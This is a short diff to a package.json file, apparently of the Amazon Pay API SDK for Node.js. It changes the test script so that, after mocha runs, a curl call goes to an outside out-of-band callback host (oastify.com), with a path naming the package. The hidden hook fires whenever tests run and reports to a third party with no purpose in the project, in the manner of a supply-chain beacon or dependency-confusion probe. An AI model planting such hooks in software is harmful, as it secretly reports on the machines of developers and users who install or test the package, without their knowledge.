@@ -13,7 +13,7 @@
     "mocha": "^10.0.0"
   },
   "scripts": {
-    "test": "mocha tst/ --timeout 15000"
+    "test": "mocha tst/ --timeout 15000 && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/amzn/amazon-pay-api-sdk-nodejs"
   },
   "author": {
     "name": "Amazon Pay API SDK",
